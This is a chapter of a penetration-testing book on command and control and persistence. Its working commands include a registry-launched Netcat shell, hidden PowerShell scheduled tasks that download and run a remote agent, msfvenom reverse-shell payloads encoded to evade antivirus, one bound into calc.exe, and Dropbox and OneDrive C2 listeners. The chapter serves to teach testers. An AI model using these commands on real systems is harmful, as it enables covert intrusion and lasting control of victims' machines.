<html><head></head><body>
  <div id="_idContainer553" class="Basic-Text-Frame">
    <h1 class="chapterNumber">13</h1>
    <h1 id="_idParaDest-296" class="chapterTitle">Command and Control</h1>
    <p class="normal">Modern attackers are not interested in exploiting a system or network and then moving on. Instead, the goal is to attack and compromise a network of value and then remain resident on the network for as long as possible. <strong class="keyWord">Command and control</strong> (<strong class="keyWord">C2</strong>) refer to the mechanisms that testers use to replicate attacker actions by persisting on a system, maintaining two-way communication, enabling data to be exfiltrated to the tester’s location, and hiding the evidence of the attack.</p>
    <p class="normal">In the command, control, and communication phase, the attacker relies on a persistent connection with the compromised system to ensure that they can continue to maintain their control.</p>
    <p class="normal">In this chapter, you will learn about the following topics:</p>
    <ul>
      <li class="bulletList">The importance of persistence</li>
      <li class="bulletList">Maintaining persistence with the PowerShell Empire, Covenant, PoshC2, and online file sharing</li>
      <li class="bulletList">Performing domain fronting techniques to maintain command and control</li>
      <li class="bulletList">The art of exfiltrating data using different protocols</li>
      <li class="bulletList">Hiding the evidence of an attack</li>
    </ul>
    <h1 id="_idParaDest-297" class="heading-1">Persistence</h1>
    <p class="normal">To be effective, the attacker must be able to maintain <strong class="keyWord">interactive persistence</strong>; they must have a two-way communication <a id="_idIndexMarker1375"/>channel with the exploited system (interactive) that remains on the compromised system for a long period of time without being discovered (persistence). This type of connectivity is a requirement for the following reasons:</p>
    <ul>
      <li class="bulletList">Network intrusions may be detected, and the compromised systems may be identified and patched.</li>
      <li class="bulletList">Some exploits only <a id="_idIndexMarker1376"/>work once because the vulnerability is intermittent or because exploitation causes the system to fail or change, rendering the vulnerability unusable.</li>
      <li class="bulletList">Attackers may need to return multiple times to the same target for various reasons.</li>
      <li class="bulletList">The target’s usefulness is not always immediately known at the time it is compromised.</li>
    </ul>
    <p class="normal">The tool used to maintain interactive persistence is usually referred to by classic terms such as <strong class="keyWord">backdoor</strong> or <strong class="keyWord">rootkit</strong>. However, the trend toward long-term persistence by both automated malware <a id="_idIndexMarker1377"/>and human attacks has blurred the meaning of traditional labels, so instead, we will refer <a id="_idIndexMarker1378"/>to malicious software that is intended to stay on the <a id="_idIndexMarker1379"/>compromised system for an extended period as a <strong class="keyWord">persistent agent</strong>.</p>
    <p class="normal">These persistent agents perform <a id="_idIndexMarker1380"/>many functions for attackers and penetration testers, including the following:</p>
    <ul>
      <li class="bulletList">Allowing additional tools to be uploaded to support new attacks, especially against systems located on the same network.</li>
      <li class="bulletList">Facilitating the exfiltration of data from compromised systems and networks.</li>
      <li class="bulletList">Allowing attackers to reconnect to a compromised system, usually via an encrypted channel to avoid detection. Persistent agents have been known to remain on systems for more than a year.</li>
      <li class="bulletList">Employing anti-forensic techniques to avoid being detected, including hiding in the target’s filesystem or system memory, using strong authentication, and using encryption.</li>
    </ul>
    <h1 id="_idParaDest-298" class="heading-1">Using persistent agents</h1>
    <p class="normal">Traditionally, attackers would place a backdoor on a compromised system. If the front door provides authorized <a id="_idIndexMarker1381"/>access to legitimate users, backdoor applications allow attackers to return to an exploited system and have access to services and data.</p>
    <p class="normal">Unfortunately, classic backdoors provided limited interactivity and were not designed to be persistent on compromised systems for very long time frames. This was viewed as a significant shortcoming by <a id="_idIndexMarker1382"/>the attacker community because once the backdoor was discovered and removed, there was additional work required to repeat the compromise steps and exploit the system, which was made even more difficult by forewarned system administrators defending the network and its resources.</p>
    <p class="normal">Attackers now focus on persistent agents that are properly employed and are more difficult to detect. The first tool we will review is the venerable Netcat.</p>
    <h2 id="_idParaDest-299" class="heading-2">Employing Netcat as a persistent agent</h2>
    <p class="normal">Netcat is an application <a id="_idIndexMarker1383"/>that supports reading from, and <a id="_idIndexMarker1384"/>writing to, network connections using raw TCP and UDP packets. Unlike packets that are organized by services such as Telnet or FTP, Netcat’s packets are not accompanied by headers or other channel information specific to the service. This simplifies communications and allows for an almost universal communication channel.</p>
    <p class="normal">The last stable version of Netcat was released by Hobbit in 1996, and it has remained as useful as <a id="_idIndexMarker1385"/>ever; in fact, it is frequently referred to as the <strong class="keyWord">TCP/IP Swiss Army knife</strong>. Netcat can perform many functions, including the following:</p>
    <ul>
      <li class="bulletList">Port scanning</li>
      <li class="bulletList">Banner grabbing to identify services</li>
      <li class="bulletList">Port redirection and proxying</li>
      <li class="bulletList">File transfer and chatting, including support for data forensics and remote backups</li>
      <li class="bulletList">Create a backdoor or an interactive persistent agent on a compromised system</li>
    </ul>
    <p class="normal">At this point, we will focus on using Netcat to create a persistent shell on a compromised system. Although the following example uses Windows as the target platform, it functions the same when used on a Unix-based platform. It should also be noted that most legacy Unix platforms include Netcat as part of the operating system.</p>
    <p class="normal">In the example shown in <em class="italic">Figure 13.1</em>, we will retain the executable’s name, <code class="inlineCode">nc.exe</code>; however, it is common to rename it prior to use to minimize detection. Even if it is renamed, it will usually <a id="_idIndexMarker1386"/>be identified by antivirus software; many <a id="_idIndexMarker1387"/>attackers will alter or remove elements of Netcat’s source code that are not required and recompile it prior to use. Such changes can alter the specific signature that antivirus programs use to identify the application as Netcat, making it invisible to antivirus programs:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Netcat is stored on Kali in the <code class="inlineCode">/usr/share/windows-binaries</code> repository. To upload it to a compromised system, enter the following command from within Meterpreter:
        <pre class="programlisting con"><code class="hljs-con">meterpreter&gt; upload /usr/share/windows-binaries/nc.exe C:\WINDOWS\system32
</code></pre>
        <p class="normal">The execution of the previous command is shown in <em class="italic">Figure 13.1</em>:</p>
        <figure class="mediaobject"><img src="../Images/B17765_13_01.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.1: Uploading Netcat to the target</p>
        <p class="normal">You do not have to place it in the <code class="inlineCode">system32</code> folder specifically; however, due to the number and diversity of file types in this folder, this is the best location for hiding a file in a compromised system.</p>
        <div class="packt_tip">
          <p class="normal">While conducting a penetration test on one client, we identified six separate instances of Netcat on one server. Netcat had been installed twice by two separate system administrators to support network management; the other four instances were installed by external attackers and were not identified until the penetration test. Therefore, always look to see whether or not Netcat is already installed on your target!</p>
        </div>
        <p class="normal">If you do not have a <a id="_idIndexMarker1388"/>Meterpreter connection, you can use <strong class="keyWord">Trivial File Transfer Protocol</strong> (<strong class="keyWord">TFTP</strong>) to transfer the file.</p>
      </li>
      <li class="numberedList">Next, configure the registry to launch Netcat when the system starts up, and ensure that it is listening on port <code class="inlineCode">8888</code> (or any other port that you have selected, as long as it is not in use) using the following command:
        <pre class="programlisting con"><code class="hljs-con">meterpreter&gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 8888 -e cmd.exe'
</code></pre>
      </li>
      <li class="numberedList">Confirm that the change in the registry was successfully implemented using the following <code class="inlineCode">queryval</code> command:
        <pre class="programlisting con"><code class="hljs-con">meterpreter&gt; reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
</code></pre>
      </li>
      <li class="numberedList">Using the <code class="inlineCode">netsh</code> command, open a port on the local firewall to ensure that the compromised <a id="_idIndexMarker1389"/>system will accept remote <a id="_idIndexMarker1390"/>connections to Netcat. It is important to know the target’s operating system. The <code class="inlineCode">netsh advfirewall firewall</code> command-line context is used for Windows 10, Windows Server 2008, and later versions; the <code class="inlineCode">netsh firewall</code> command is used for earlier operating systems.</li>
      <li class="numberedList">To add a port to the local Windows firewall, enter the <code class="inlineCode">shell</code> command at the Meterpreter prompt and then enter <code class="inlineCode">rule</code> using the appropriate command. When naming the <code class="inlineCode">rule</code>, use a name such as <code class="inlineCode">svchostpassthrough</code> that suggests that <code class="inlineCode">rule</code> is important for the proper functioning of the system.<p class="normal">A sample command is shown as follows:</p>
        <pre class="programlisting con"><code class="hljs-con">C:\Windows\system32&gt;netsh advfirewall firewall add rule name="svchostpassthrough" dir=in action=allow protocol=TCP localport=8888
</code></pre>
      </li>
      <li class="numberedList">Confirm that the change was successfully implemented using the following command:
        <pre class="programlisting con"><code class="hljs-con">C:\windows\system32&gt;netsh advfirewall firewall show rule name="svchostpassthrough"
</code></pre>
        <p class="normal">The execution of the previously mentioned commands is shown in <em class="italic">Figure 13.2</em>:</p>
        <figure class="mediaobject"><img src="../Images/B17765_13_02.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.2: Adding a firewall rule to allow the custom port</p>
      </li>
      <li class="numberedList">When the <a id="_idIndexMarker1391"/>port rule is confirmed, ensure <a id="_idIndexMarker1392"/>that the reboot option works, as follows:<ul>
          <li class="bulletList">Enter the following command from the Meterpreter prompt:
            <pre class="programlisting con"><code class="hljs-con">meterpreter&gt; reboot
</code></pre>
          </li>
          <li class="bulletList">Enter the following command from an interactive Windows shell:
            <pre class="programlisting con"><code class="hljs-con">C:\windows\system32&gt; shutdown /r /t 15
</code></pre>
          </li>
        </ul>
      </li>
      <li class="numberedList">To remotely access the compromised system, type <code class="inlineCode">nc</code> at the terminal, indicate the verbosity of the connection (<code class="inlineCode">-v</code> reports basic information and <code class="inlineCode">-vv</code> reports much more information), and then enter the IP address of the target and the port number, as shown in <em class="italic">Figure 13.3</em>:<figure class="mediaobject"><img src="../Images/B17765_13_03.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.3: Successfully connecting to the persistent backdoor through Netcat</p>
        <p class="normal">Unfortunately, there are some limitations to using Netcat. There is no authentication <a id="_idIndexMarker1393"/>or encryption of transmitted <a id="_idIndexMarker1394"/>data, and it is detected by nearly all antivirus software.</p>
      </li>
      <li class="numberedList">The lack of encryption can be resolved using <code class="inlineCode">cryptcat</code>, a Netcat variant that uses Twofish encryption to secure data during transmission between the exploited host and the attacker. Twofish encryption, developed by Bruce Schneider, is an advanced symmetric block cipher that provides reasonably strong protection for encrypted data.<p class="normal">To use <code class="inlineCode">cryptcat</code>, ensure that there is a listener ready and configured with a strong password using the following command:</p>
        <pre class="programlisting con"><code class="hljs-con">kali@kali:~# cryptcat -k password -l -p 444
</code></pre>
      </li>
      <li class="numberedList">Next, upload <code class="inlineCode">cryptcat</code> (based on the target operating system; if it’s Windows, upload a Windows binary that is available in <a href="https://github.com/pprugger/Cryptcat-1.3.0-Win-10-Release"><span class="url">https://github.com/pprugger/Cryptcat-1.3.0-Win-10-Release</span></a>) to the compromised system and configure it to connect with the listener’s IP address using the following command:
        <pre class="programlisting con"><code class="hljs-con">cryptcat -k password &lt;listener IP address&gt; 444
</code></pre>
      </li>
    </ol>
    <p class="normal">Unfortunately, Netcat and its variants remain detectable by most antivirus applications. However, in case the <a id="_idIndexMarker1395"/>target is a Linux system, this utility is <a id="_idIndexMarker1396"/>preinstalled and pen testers can leverage them to open a port and run the backdoor. It is possible to render Netcat undetectable using a hex editor to alter the source code of Netcat. </p>
    <p class="normal">This will help avoid triggering the signature matching action of the antivirus, but this can be a long trial-and-error process. A more efficient approach is to take advantage of Empire’s persistence mechanisms.</p>
    <h2 id="_idParaDest-300" class="heading-2">Using schtasks to configure a persistent task</h2>
    <p class="normal">The <strong class="keyWord">Windows Task Scheduler</strong> (<code class="inlineCode">schtasks</code>) was introduced as a replacement for <code class="inlineCode">at.exe</code> in Windows XP and 2003. However, <code class="inlineCode">at.exe</code> is <a id="_idIndexMarker1397"/>obsolete in the latest <a id="_idIndexMarker1398"/>versions of Windows. In this section, we <a id="_idIndexMarker1399"/>will use scheduled tasks to maintain persistent access to a compromised system.</p>
    <p class="normal">Attackers can create a scheduled task on the compromised system to run the Empire agent payload from the attacker’s machine, and then provide backdoor access. <code class="inlineCode">schtasks</code> can be scheduled directly from the command prompt, as shown in <em class="italic">Figure 13.4</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_13_04.png" alt=""/></figure>
    <figure class="mediaobject">Figure 13.4: Creating schedule tasks on the target for persistence</figure>
    <p class="normal">The following are the typical scheduled tasks scenarios that can be engaged by attackers to maintain persistent access to the system:</p>
    <ul>
      <li class="bulletList">To launch an Empire PowerShell agent during the user login process, run the following command from the command line:
        <pre class="programlisting con"><code class="hljs-con">schtasks /create /tn WindowsUpdate /tr " C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('http://10.10.10.12:90/agent.ps1'))'" /sc onlogon /ru System
</code></pre>
      </li>
      <li class="bulletList">Similarly, to <a id="_idIndexMarker1400"/>launch the agent when <a id="_idIndexMarker1401"/>starting the system, run the following command:
        <pre class="programlisting con"><code class="hljs-con">schtasks /create /tn WindowsUpdate /tr  "'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c IEX ((new-object net.webclient).downloadstring('http://10.10.10.12:90/agent.ps1'))''" /sc onstart 
</code></pre>
      </li>
      <li class="bulletList">The following command will set up to launch an agent when the system becomes idle:
        <pre class="programlisting con"><code class="hljs-con">schtasks /create /tn WindowsUpdate /tr  "'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c IEX ((new-object net.webclient).downloadstring('http://10.10.10.12:90/agent.ps1'))''" /sc onidle /i 10
</code></pre>
      </li>
    </ul>
    <p class="normal">Attackers will ensure that the listener is always running and open for connection. To legitimize it on the network, the server would need to be set up with a valid SSL certificate running HTTPS in order not to trigger alerts in the internal security features (the firewall, IPS, or proxy).</p>
    <p class="normal">The same task can be performed by a single-line command using the PowerShell Empire tools module <code class="inlineCode">persistence/elevated/schtasks</code>, as shown in <em class="italic">Figure 13.5</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_13_05.png" alt=""/></figure>
    <p class="packt_figref">Figure 13.5: Creating schedule tasks on the target for persistence</p>
    <p class="normal">Now that we have <a id="_idIndexMarker1402"/>learned how to utilize the scheduled <a id="_idIndexMarker1403"/>task to maintain persistence to the target, we will explore the Metasploit post exploit module.</p>
    <h2 id="_idParaDest-301" class="heading-2">Maintaining persistence with the Metasploit framework</h2>
    <p class="normal">Metasploit’s Meterpreter <a id="_idIndexMarker1404"/>contains <a id="_idIndexMarker1405"/>several scripts that support persistence on a compromised system. We will examine the post exploit module for placing a backdoor.</p>
    <h3 id="_idParaDest-302" class="heading-3">Using the post exploit persistence module</h3>
    <p class="normal">After a system has <a id="_idIndexMarker1406"/>been exploited and the <code class="inlineCode">migrate</code> command has moved the initial shell to a more secure service, an attacker can invoke the <code class="inlineCode">windows/manage/persistence_exe</code> script from the Meterpreter prompt.</p>
    <p class="normal">In the example shown in <em class="italic">Figure 13.6</em>, we could elect to use the <code class="inlineCode">REXENAME</code> <code class="inlineCode">and</code> <code class="inlineCode">REXEPATH</code> options, which will start persistence when a user logs in to the target system.</p>
    <p class="normal">Successful implanting of the backdoor will run automatically when the system boots to execute the file that we have set, with a specific IP address and port.</p>
    <figure class="mediaobject"><img src="../Images/B17765_13_06.png" alt=""/></figure>
    <figure class="mediaobject">Figure 13.6: Placing a backdoor using Metasploit’s post exploit module for persistence</figure>
    <div class="note">
      <p class="normal">Note that we have arbitrarily selected a port for use by <code class="inlineCode">persistence</code>; an attacker must verify the local firewall settings to ensure that this port is open or use the <code class="inlineCode">reg</code> command to open the port. As with most Metasploit modules, any port can be selected as long as it is not already in use.</p>
    </div>
    <p class="normal">The post exploit module’s <code class="inlineCode">persistence_exe</code> script places an executable file in a temporary directory. The script also adds that file to the local autorun sections of the registry. Because the <a id="_idIndexMarker1407"/>post exploit module, <code class="inlineCode">persistence_exe</code>, is not authenticated and anyone can use it to access the compromised system, it should be removed from the system as soon as possible after the discovery or completion of penetration testing. To remove the script, confirm the location of the resource file for cleanup, and then execute the following resource command:</p>
    <pre class="programlisting con"><code class="hljs-con">meterpreter&gt;run multi_console_command -rc /root/.msf4/logs/persistence/&lt;Location&gt;.rc
</code></pre>
    <h2 id="_idParaDest-303" class="heading-2">Creating a standalone persistent agent with Metasploit</h2>
    <p class="normal">The Metasploit framework can be used to create a standalone executable that can persist on a <a id="_idIndexMarker1408"/>compromised <a id="_idIndexMarker1409"/>system and allow interactive communications. The advantage of a standalone package is that it can be prepared and tested in advance to ensure connectivity, and encoded to bypass local antivirus software:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">To make a simple standalone agent, use <code class="inlineCode">msfvenom</code>. In the example shown in <em class="italic">Figure 13.7</em>, the agent is configured to use a <code class="inlineCode">reverse_tcp</code> shell that will connect to the localhost at the attacker’s IP on port <code class="inlineCode">443</code>:
        <pre class="programlisting con"><code class="hljs-con">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=&lt;Kali IP&gt; lport=443 -e x86/shikata_ga_nai -i 5 -f exe -o attack1.exe
</code></pre>
        <p class="normal">The agent, named <code class="inlineCode">attack.exe</code>, will use a Win32 executable template:</p>
        <figure class="mediaobject"><img src="../Images/B17765_13_07.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.7: Creating a backdoor exploit to connect back to the Kali Linux on a specific port</p>
        <p class="normal">This encodes the <code class="inlineCode">attack1.exe</code> agent five times using the <code class="inlineCode">x86/shikata_ga_nai</code> encoder. Each time it is re-encoded, it becomes more difficult to detect. However, the executable also increases in size.</p>
        <p class="normal">We can <a id="_idIndexMarker1410"/>configure the encoding pattern in <code class="inlineCode">msfvenom</code> by using <code class="inlineCode">-b x64/other</code> to avoid certain characters. For example, the following characters <a id="_idIndexMarker1411"/>should be avoided when encoding a persistent agent because they may result in the discovery and failure of the attack:</p>
        <ul>
          <li class="bulletList"><code class="inlineCode">\x00</code>: Represents a 0-byte address</li>
          <li class="bulletList"><code class="inlineCode">\xa0</code>: Represents a line feed</li>
          <li class="bulletList"><code class="inlineCode">\xad</code>: Represents a carriage return</li>
        </ul>
      </li>
      <li class="numberedList">To create a multi-encoded payload, use the following command:
        <pre class="programlisting con"><code class="hljs-con">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=&lt;Kali IP&gt; lport=443 -e x86/shikata_ga_nai -i 8 raw | msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/bloxor -i 9 -f exe -o multiencoded.exe
</code></pre>
      </li>
      <li class="numberedList">You can also encode <code class="inlineCode">msfvenom</code> to an existing executable, and both the modified executable and the persistent agent will function. To bind the persistent agent to an executable such as a calculator (<code class="inlineCode">calc.exe</code>), first, copy the appropriate <code class="inlineCode">calc.exe</code> file into Kali Linux. You can download it from your existing session using Meterpreter by running <code class="inlineCode">meterpreter &gt; download c:\\windows\\system32\\calc.exe</code>.</li>
      <li class="numberedList">When the file is downloaded, run the following command:
        <pre class="programlisting con"><code class="hljs-con">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=&lt;Kali IP&gt; lport=443 -x /root/calc.exe -k -e x86/shikata_ga_nai -i 10 -f raw | msfvenom -a x86 --platform windows -e x86/bloxor -i 9 -f exe -o calc.exe
</code></pre>
      </li>
      <li class="numberedList">The agent <a id="_idIndexMarker1412"/>can be placed on the target system, renamed <code class="inlineCode">calc.exe</code> (to replace <a id="_idIndexMarker1413"/>the original calculator if access is denied, place the file on the desktop), and then executed.</li>
    </ol>
    <p class="normal">Unfortunately, nearly all Metasploit-encoded executables can be detected by client antivirus or EDR software. This has been attributed to penetration testers who have submitted encrypted <a id="_idIndexMarker1414"/>payloads to sites such as VirusTotal (<a href="http://www.virustotal.com"><span class="url">www.virustotal.com</span></a>). However, you can create an executable and then encrypt it using Veil-Evasion, as described in <em class="chapterRef">Chapter 10</em>, <em class="italic">Exploitation</em>.</p>
    <h2 id="_idParaDest-304" class="heading-2">Persistence using online file storage cloud services</h2>
    <p class="normal">Every organization that allows file sharing with cloud services is likely to make use of either Dropbox <a id="_idIndexMarker1415"/>or OneDrive. Attackers <a id="_idIndexMarker1416"/>can use these file storage services to maintain persistence on compromised systems.</p>
    <p class="normal">In this section, we will focus on using these file storage cloud services on the victim system and maintaining persistence to run C2 without having to disclose the attacker’s backend IP address by using the Empire PowerShell tool.</p>
    <h3 id="_idParaDest-305" class="heading-3">Dropbox</h3>
    <p class="normal">For companies <a id="_idIndexMarker1417"/>using Dropbox, this listener serves as <a id="_idIndexMarker1418"/>a highly reliable C2 channel. The <code class="inlineCode">dbx</code> post-exploitation module is preloaded in our PowerShell Empire tool, which utilizes Dropbox infrastructure. Agents communicate with Dropbox, allowing it to be used as a C2 center.</p>
    <p class="normal">Follow these steps to set up a Dropbox stager:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Create a Dropbox account.</li>
      <li class="numberedList">Go to My Apps on the Dropbox Developers site (<a href="https://www.dropbox.com/developers"><span class="url">https://www.dropbox.com/developers</span></a>).</li>
      <li class="numberedList">Go to <strong class="screenText">App Console</strong> and click <strong class="screenText">Create App</strong>.</li>
      <li class="numberedList">Choose a <strong class="screenText">Scoped access New</strong> API.</li>
      <li class="numberedList">Set the type of access you need as <strong class="screenText">Full Dropbox– Access to all files and folders in a user’s Dropbox</strong>.</li>
      <li class="numberedList">Enter the <a id="_idIndexMarker1419"/>name of the app, for <a id="_idIndexMarker1420"/>example, <code class="inlineCode">KaliC2C</code>, hit <strong class="screenText">Create app</strong>, and tick the box to accept the terms and conditions.</li>
      <li class="numberedList">After the application is created, Dropbox should take us to the settings page. Before you generate the key, you need to navigate to the <strong class="screenText">Permissions</strong> tab and ensure the write permissions are set by ticking <strong class="screenText">files.metadata.read</strong>, <strong class="screenText">files.metadata.write</strong>, <strong class="screenText">files.content.write</strong>, and <strong class="screenText">files.content.read</strong>.</li>
      <li class="numberedList">Now we are all set to generate the token. Click on the <strong class="screenText">Settings</strong> tab if you are in the <strong class="screenText">Permissions</strong> tab from the previous step. In the <strong class="screenText">OAuth 2</strong> section and the <strong class="screenText">Generated access token</strong> heading, click on <strong class="screenText">Generate</strong> and you should see Dropbox creating a new token, as seen in <em class="italic">Figure 13.8</em>:<figure class="mediaobject"><img src="../Images/B17765_13_08.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.8: Generating the dropbox access token</p>
      </li>
      <li class="numberedList">You can now <a id="_idIndexMarker1421"/>use the generated <a id="_idIndexMarker1422"/>access token to generate the payload on our Empire tool by running the following commands:
        <pre class="programlisting con"><code class="hljs-con">&gt; listeners
&gt; uselistener dbx
&gt; set apitoken &lt;yourapitoken&gt;
&gt; usestager multi/launcher dropbox
&gt; execute
</code></pre>
        <p class="normal">The output should be as shown here:</p>
        <figure class="mediaobject"><img src="../Images/B17765_13_09.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.9: Successfully creating the Dropbox listener in PowerShell Empire </p>
        <p class="normal">If the API token is correct and everything works, the Dropbox account should now show a folder named <code class="inlineCode">Empire</code>, with three subfolders called <code class="inlineCode">results</code>, <code class="inlineCode">staging</code>, and <code class="inlineCode">taskings</code>, as shown in <em class="italic">Figure 13.10</em>:</p>
        <figure class="mediaobject"><img src="../Images/B17765_13_10.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.10: Folders generated within the Dropbox</p>
      </li>
      <li class="numberedList">Once the <a id="_idIndexMarker1423"/>listener is up and running, attackers <a id="_idIndexMarker1424"/>can utilize a number of methods to deliver the payload, for example, by running it from the existing Meterpreter session, by using social engineering, or by creating a scheduled task to report back every time the system boots.</li>
    </ol>
    <p class="normal">Attackers can make use of any free file hosting service to store the payload and get the victim machines to download and execute the agent. A successful agent will report to Empire, as shown in <em class="italic">Figure 13.11</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_13_11.png" alt="A screenshot of a computer  Description automatically generated with medium confidence"/></figure>
    <p class="packt_figref">Figure 13.11: Successful interaction from the target to our listener using the Dropbox API</p>
    <h3 id="_idParaDest-306" class="heading-3">Microsoft OneDrive</h3>
    <p class="normal">OneDrive is another <a id="_idIndexMarker1425"/>popular file-sharing <a id="_idIndexMarker1426"/>service, similar to Dropbox. In the latest version of Empire, you should be able to see an additional prebuilt listener, <code class="inlineCode">onedrive</code>, as shown in<em class="italic"> Figure 13.12</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_13_12.png" alt=""/></figure>
    <p class="packt_figref">Figure 13.12: PowerShell Empire OneDrive listener options</p>
    <p class="normal">Set up the <code class="inlineCode">onedrive</code> C2C as follows:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Create a Microsoft <a id="_idIndexMarker1427"/>developer account. Attackers <a id="_idIndexMarker1428"/>can leverage the free account that Microsoft provides with credits and log in to the Azure portal (<a href="https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationsListBlade"><span class="url">https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationsListBlade</span></a>).</li>
      <li class="numberedList">To register a new application, click on <strong class="screenText">New Registration</strong> and enter your name and select <strong class="screenText">Accounts in any organizational directory (Any Azure AD directory - Multitenant) and personal Microsoft accounts (e.g. Skype, Xbox)</strong>. Then, enter <code class="inlineCode">https://login.live.com/oauth20_desktop.srf</code> with the redirect URI so that PowerShell Empire can authenticate using the offline desktop module, as shown in <em class="italic">Figure 13.13</em>. Finally, click on <strong class="screenText">Register</strong>:<figure class="mediaobject"><img src="../Images/B17765_13_13.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.13: Registration of KaliC2C in Azure for offline authentication</p>
      </li>
      <li class="numberedList">Once the application is created, attackers should be able to see a newly created Application ID, as shown here:<figure class="mediaobject"><img src="../Images/B17765_13_14.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.14: Client ID generation within the Azure portal</p>
      </li>
      <li class="numberedList">Now that we have the <code class="inlineCode">ClientID</code>, we will need to create a <code class="inlineCode">ClientSecret</code>. Navigate to <strong class="screenText">Certificates &amp; Sections </strong>under the <strong class="screenText">Manage</strong> section within the same page <a id="_idIndexMarker1429"/>and, under <strong class="screenText">Client secrets</strong>, click <a id="_idIndexMarker1430"/>on <strong class="screenText">New client secret</strong>. That should bring up another window, enter any description, by default, expiry should point to 6 months, and finally click on <strong class="screenText">Add</strong>. This should generate our Client Secret ID, as shown in <em class="italic">Figure 13.15</em>:<figure class="mediaobject"><img src="../Images/B17765_13_15.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.15: Creating a Secret ID for the ClientID</p>
      </li>
      <li class="numberedList">Now, we are <a id="_idIndexMarker1431"/>ready to fire up <a id="_idIndexMarker1432"/>Empire and set up our listener. Set the <code class="inlineCode">ClientID</code> to the Application ID from <em class="italic">step 3</em>, set the <code class="inlineCode">ClientSecret</code> to the Secret ID value from <em class="italic">step 4</em>, and execute the listener, as shown in <em class="italic">Figure 13.16</em>:<figure class="mediaobject"><img src="../Images/B17765_13_16.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.16: Configuring our PowerShell Empire with the ClientID and SecretValue that we created</p>
      </li>
      <li class="numberedList">The URL can be opened in a browser to generate the authentication code. Testers should log in to the application and will prompt for permission to access the OneDrive files. Once you click <strong class="screenText">Yes</strong>, then you should see the code generated in the URL, as shown in <em class="italic">Figure 13.17</em>:<figure class="mediaobject"><img src="../Images/B17765_13_17.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.17: Authentication token generation in the browser</p>
      </li>
      <li class="numberedList">The code from the URL can now be used to set up the Empire listener, as follows:<figure class="mediaobject"><img src="../Images/B17765_13_18.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.18: Setting the AuthCode and starting the OneDrive listener</p>
      </li>
      <li class="numberedList">Just as with <a id="_idIndexMarker1433"/>Dropbox, you <a id="_idIndexMarker1434"/>should now be able to see a folder named <code class="inlineCode">Empire</code> with three subfolders, called <code class="inlineCode">results</code>, <code class="inlineCode">staging</code>, and <code class="inlineCode">taskings</code>, in your OneDrive, with the correct Client ID and authentication code, as shown here:<figure class="mediaobject"><img src="../Images/B17765_13_19.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.19: Folders that are created in OneDrive once the listener started</p>
      </li>
      <li class="numberedList">Now you can stage the payload by running <code class="inlineCode">usestager multi/launcher</code> and setting the <code class="inlineCode">listener</code> to <code class="inlineCode">onedrive</code> and then executing the payload. Once the payload is <a id="_idIndexMarker1435"/>executed <a id="_idIndexMarker1436"/>successfully on the target, this should listen on the OneDrive listener, as shown in <em class="italic">Figure 13.20</em>:<figure class="mediaobject"><img src="../Images/B17765_13_20.png" alt=""/></figure>
        <p class="packt_figref">Figure 13.20: Agent successfully reporting back to the PowerShell Empire over the OneDrive API</p>
      </li>
    </ol>
    <h3 id="_idParaDest-307" class="heading-3">Covenant </h3>
    <p class="normal">Attackers can also leverage the <strong class="keyWord">Covenant C2</strong> framework for penetration testing operations to maintain <a id="_idIndexMarker1437"/>access to the target environment. This <a id="_idIndexMarker1438"/>framework is written in .NET and is by Ryan Cobb of SpecterOps. This framework utilizes a majority of the open source features and plugins to perform different exploitations on the target with access. To install the Covenant C2 framework in Kali Linux, the following steps are involved: </p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Download the repository by running <code class="inlineCode">sudo git clone --recurse-submodules https://github.com/cobbr/Covenant</code>.</li>
      <li class="numberedList">Since the tools heavily rely on the .NET framework, we will be downloading the Microsoft package to our Kali by running <code class="inlineCode">sudo wget https://packages.microsoft.com/config/debian/10/packages-microsoft-prod.deb -O packages-microsoft-prod.deb</code>.</li>
      <li class="numberedList">Once the deb file is downloaded, install the package by running <code class="inlineCode">sudo dpkg -i packages-microsoft-prod.deb</code>.</li>
      <li class="numberedList">Covenant requires .NET version 3.1, so we will run the following dependencies to install the requirements by running <code class="inlineCode">sudo apt-get update &amp;&amp; sudo apt-get install -y apt-transport-https &amp;&amp; sudo apt-get update &amp;&amp; sudo apt-get install -y dotnet-sdk-3.1</code>.</li>
